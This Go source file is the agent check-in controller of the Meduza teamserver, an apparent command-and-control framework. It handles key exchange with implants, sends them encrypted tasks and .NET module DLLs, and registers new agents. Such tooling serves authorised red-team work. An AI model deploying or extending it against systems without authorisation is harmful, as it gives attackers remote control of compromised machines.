package checkin

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/ksel172/Meduza/teamserver/internal/storage"
	"github.com/ksel172/Meduza/teamserver/internal/storage/dal"
	"github.com/ksel172/Meduza/teamserver/models"
	"github.com/ksel172/Meduza/teamserver/pkg/conf"
	"github.com/ksel172/Meduza/teamserver/pkg/logger"
	"github.com/ksel172/Meduza/teamserver/utils"
)

var (
	ErrNotFound       = errors.New("resource not found")
	ErrDatabase       = errors.New("database error")
	ErrInternalServer = errors.New("internal server error")
	ErrUnauthorized   = errors.New("unauthorized")
	ErrInvalidData    = errors.New("invalid data")
	ErrConflict       = errors.New("conflict")
)

type CheckInController struct {
	agentDAL dal.IAgentDAL
}

type AuthResponse struct {
	PublicKey    []byte
	SessionToken string
}

func (cc *CheckInController) Authenticate(agentPublicKey string, authToken string) (AuthResponse, error) {
	// Retrieve the server private key to derive shared key
	// and the public key to send to the agent
	serverKeyPair, ok := storage.AsymmetricKeyRegistry.GetKeys(authToken)
	if !ok {
		return AuthResponse{}, fmt.Errorf("key not found from auth token")
	}

	// Generate AES session key and store in the registry
	aesKey, err := utils.DeriveECDHSharedSecret(serverKeyPair.PrivateKey, []byte(agentPublicKey))
	if err != nil {
		return AuthResponse{}, fmt.Errorf("failed to derive shared key: %v", err)
	}

	// Generate a unique session token
	sessionToken := uuid.New().String()

	// Store the session token and map it to the AES key
	storage.KeyRegistry.WriteKey(sessionToken, aesKey)

	return AuthResponse{
		PublicKey:    serverKeyPair.PublicKey,
		SessionToken: sessionToken,
	}, nil
}

func (cc *CheckInController) HandleTaskRequest(ctx context.Context, c2request models.C2Request, sessionToken string) ([]byte, error) {
	tasks, err := cc.agentDAL.GetAgentTasks(ctx, c2request.AgentID)
	if err != nil {
		logger.Info(fmt.Sprintf("Failed to get tasks for agent %s: %v", c2request.AgentID, err))
		return nil, fmt.Errorf("failed to get tasks: %w", ErrDatabase)
	}

	// Create a new slice for pending tasks
	pendingTasks := make([]models.AgentTask, 0)

	// Only process non-completed tasks
	for _, task := range tasks {
		if task.Status == models.TaskComplete {
			continue
		}

		// Handle module commands
		if task.Type == models.ModuleCommand {
			moduleDirPath := filepath.Join(conf.GetModuleUploadPath(), task.Module)
			moduleName := task.Command.Name

			modulePath := filepath.Join(moduleDirPath, moduleName)
			mainModuleBytes, err := utils.LoadAssembly(filepath.Join(modulePath, moduleName+".dll"))
			if err != nil {
				logger.Info(fmt.Sprintf("Failed to load main module: %v", err))
				return nil, fmt.Errorf("failed to load main module: %w", ErrInternalServer)
			}

			loadingModulePath := moduleDirPath + "/" + moduleName + "/"
			dependencyBytes := make(map[string][]byte)
			files, err := os.ReadDir(loadingModulePath)
			if err != nil {
				logger.Info(fmt.Sprintf("Failed to read module directory: %v", err))
				return nil, fmt.Errorf("failed to read module directory: %w", ErrInternalServer)
			}

			for _, file := range files {
				if file.Name() != moduleName+".dll" && strings.HasSuffix(file.Name(), ".dll") {
					depBytes, err := utils.LoadAssembly(filepath.Join(loadingModulePath, file.Name()))
					if err != nil {
						logger.Info(fmt.Sprintf("Failed to load main module: %v", err))
						return nil, fmt.Errorf("failed to load dependency :%w", ErrInternalServer)
					}
					dependencyBytes[file.Name()] = depBytes
				}
			}

			moduleBytes := models.ModuleBytes{
				ModuleBytes:     mainModuleBytes,
				DependencyBytes: dependencyBytes,
			}

			moduleBytesJSON, err := json.Marshal(moduleBytes)
			if err != nil {
				logger.Info(fmt.Sprintf("Failed to marshal module bytes: %v", err))
				return nil, fmt.Errorf("failed to marshal module: %w", ErrInternalServer)
			}

			task.Module = base64.StdEncoding.EncodeToString(moduleBytesJSON)
		}

		// Add non-completed task to pending tasks
		pendingTasks = append(pendingTasks, task)
	}

	// Update the agent's last callback time
	lastCallback := time.Now().Format(time.RFC3339)
	if err := cc.agentDAL.UpdateAgentLastCallback(ctx, c2request.AgentID, lastCallback); err != nil {
		logger.Info(fmt.Sprintf("Failed to update agent last callback: %v", err))
		return nil, fmt.Errorf("failed to update agent last callback: %w", ErrInternalServer)
	}

	// Use pendingTasks instead of tasks for the response
	tasksJSON, err := json.Marshal(pendingTasks)
	if err != nil {
		logger.Info(fmt.Sprintf("Failed to marshal tasks: %v", err))
		return nil, fmt.Errorf("failed to marshal tasks: %w", ErrInternalServer)
	}

	var c2response models.C2Request
	c2response.AgentID = c2request.AgentID
	c2response.Reason = models.Task
	c2response.Message = string(tasksJSON)

	key, exists := storage.KeyRegistry.GetKey(sessionToken)
	if !exists {
		return nil, ErrUnauthorized
	}

	responseBytes, err := json.Marshal(c2response)
	if err != nil {
		logger.Info(fmt.Sprintf("Failed to marshal response: %v", err))
		return nil, fmt.Errorf("failed to marshal response: %w", ErrInternalServer)
	}

	encryptedC2Response, err := utils.AesEncrypt(key, responseBytes)
	if err != nil {
		return nil, fmt.Errorf("failed to encrypt response: %w", ErrInternalServer)
	}

	return encryptedC2Response, nil
}

func (cc *CheckInController) HandleResponseRequest(ctx context.Context, c2request models.C2Request) error {
	var agentTask models.AgentTask
	if err := json.Unmarshal([]byte(c2request.Message), &agentTask); err != nil {
		logger.Info(fmt.Sprintf("Failed to unmarshal agent message: %v", err))
		return ErrInvalidData
	}

	err := cc.agentDAL.UpdateAgentTask(ctx, agentTask)
	if err != nil {
		logger.Info(fmt.Sprintf("Failed to update agent task: %v", err))
		return ErrInternalServer
	}

	logger.Info(fmt.Sprintf("Successfully updated agent task: %s", agentTask.TaskID))
	return nil
}

func (cc *CheckInController) HandleRegisterRequest(ctx context.Context, c2request models.C2Request) error {
	logger.Info(fmt.Sprintf("Received register request from agent: %s", c2request.AgentID))

	var agentInfo models.AgentInfo
	if err := json.Unmarshal([]byte(c2request.Message), &agentInfo); err != nil {
		logger.Info(fmt.Sprintf("Failed to parse agent info from decrypted message: %v", err))
		return ErrInvalidData
	}

	if _, err := cc.agentDAL.GetAgent(ctx, agentInfo.AgentID); err == nil {
		logger.Info("Agent already exists:", c2request.AgentID)
		return ErrConflict
	}

	newAgent := c2request.IntoNewAgent()
	newAgent.Name = utils.RandomString(6)

	if err := cc.agentDAL.RegisterAgent(ctx, newAgent); err != nil {
		logger.Info(fmt.Sprintf("Failed to create agent: %v", err))
		return ErrInternalServer
	}

	if err := cc.agentDAL.CreateAgentInfo(ctx, agentInfo); err != nil {
		logger.Info(fmt.Sprintf("Failed to create agent info: %v", err))
		return ErrInternalServer
	}

	return nil
}
